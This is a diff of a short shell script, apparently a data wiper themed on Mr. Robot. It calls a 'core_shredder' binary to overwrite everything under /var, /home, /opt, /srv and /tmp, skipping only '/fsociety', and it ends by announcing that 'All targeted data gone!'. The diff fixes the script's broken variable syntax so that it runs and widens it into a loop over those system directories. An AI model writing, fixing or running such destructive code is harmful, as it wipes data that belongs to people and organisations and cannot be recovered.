@@ -1,17 +1,19 @@
 #! /usr/bin/sh
 
-TARGET_DIR = "/"
-EXCLUDED_DIR = "/fsociety"
-
-SHREDDER_BIN = "./tools/core_shredder"
+TARGET_DIRS="/var /home /opt /srv /tmp"
+EXCLUDED_DIR="/fsociety"
+SHREDDER_BIN="./tools/core_shredder"
 
 if [ ! -f "$SHREDDER_BIN" ]; then
-  echo "[!] Error: Couln't find ($SHREDDER_BIN)!"
+  echo "[!] Error: Couldn't find ($SHREDDER_BIN)!"
   exit 1
 fi
 
-echo "[*] Rewriting data with garbage..."
+for DIR in $TARGET_DIRS; do
+  if [ -d "$DIR" ]; then
+    echo "[*] Rewriting data in $DIR..."
+    "$SHREDDER_BIN" "$DIR" "$EXCLUDED_DIR"
+  fi
+done
 
-"$SHREDDER_BIN" "$TARGET_DIR" "$EXCLUDED_DIR"
-
-echo "[*] All the data gone!"
+echo "[*] All targeted data gone!"
